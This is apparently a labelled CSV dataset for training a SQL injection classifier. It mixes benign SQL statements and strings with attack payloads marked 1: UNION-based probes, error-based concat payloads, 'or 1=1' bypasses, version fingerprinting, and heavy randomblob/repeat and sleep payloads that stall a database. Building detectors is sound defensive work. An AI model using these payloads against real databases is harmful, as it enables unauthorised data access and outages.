Query,Label
SELECT TOP 3 * FROM nature,0
SELECT TOP 3 * FROM ear SELECT * FROM about 3SELECT * FROM badly,0
kara-lyn,0
DELETE FROM seems WHERE cream = 'production',0
SELECT MIN ( religious )  AS bottom FROM situation,0
"-1031%"" union all select 6832,6832,6832,6832#",1
SELECT AVG ( Price ) FROM potatoes,0
"etorbidea askatasuna 170, 8?a",0
"   SELECT being,older,distance,nobody,building     (  (  tin JOIN reach ON again.noise =  lost.appropriate )   INNER JOIN aliveON Orders.buried =  speech.grandfatherID ) ",0
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",1
"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"-7006' where 6966  =  6966 union all select 6966,6966,6966,6966#",1
select   (  case when   (  4043  =  5276  )   then 4043 else 4043*  (  select 4043 from information_schema.character_sets  )   end  )  #,1
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1
"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
22212,0
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1
SELECT * FROM  ( SELECT tight FROM leader ) ,0
SELECT * FROM swim WHERE ship NOT LIKE '[suppose]%',0
15911,0
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper,0
"1' where 9241  =  9241 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT MIN ( list )  AS enjoy FROM happened,0
de2ape91ibi1ie4to,0
villanueva de sigena,0
brando@elsentidodelavida.lc,0
atilio,0
kappa,0
"1   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  9401  =  9401",1
-4208%'   )    )     )   or 1133  =  9010--,1
rasmia,0
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1
"praza madre lestonnac, s/n",0
"   SELECT specific, matter, dailyFROM customs WHERE wave  IS NOT NULL",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367676 )  ORDER BY meta_id ASC",0
SELECT AVG ( cause ) FROM weather SELECT SUM ( dig ) ,0
haroun,0
"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1 and make_set  (  8403  =  8403,8899  )  ",1
rist,0
SELECT AVG ( Price ) FROM produce,0
SELECT COUNT ( DISTINCT closer )  FROM pipe,0
SELECT * FROM  ( SELECT numeral FROM experiment ) ,0
SELECT * FROM she 3 SELECT * FROM further,0
"-5313'  )   union all select 7187,7187,7187#",1
"INSERT INTO son  ( observe, leaving, powder )  VALUES  ( 'greatest', 'apart', 'sure' )  ",0
"1""  )   as uorp where 7208  =  7208",1
1.61637E+15,0
SELECT vote FROM strange,0
SELECT bill,0
SELECT * FROM club  WHERE planning NOT LIKE '[pocket]%',0
"SELECT SupplierName, ContactName, Address, City, PostalCode, Country FROM Suppliers; INSERT INTO Customers  ( CustomerName, City, Country )  ",0
SELECT MIN ( walk )  AS exactly FROM substance,0
"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",1
select   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  #,1
DELETE FROM union WHERE drew = 'gravity',0
 or sleep  (  __TIME__  )  #,1
SELECT drive ( s )  FROM rest SELECT roll ( s ) ,0
SELECT MIN ( plan )  AS doctor FROM touch,0
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0
SELECT * FROM Customers WHERE  ( CustomerName LIKE 'L%' OR CustomerName LIKE 'R%' /*OR CustomerName LIKE 'S%' OR CustomerName LIKE 'T%'*/ OR CustomerName LIKE 'W%' )  AND Country = 'USA' ORDER BY CustomerName;,0
SELECT AVG ( constantly ) FROM nation SELECT SUM ( forget ) ,0
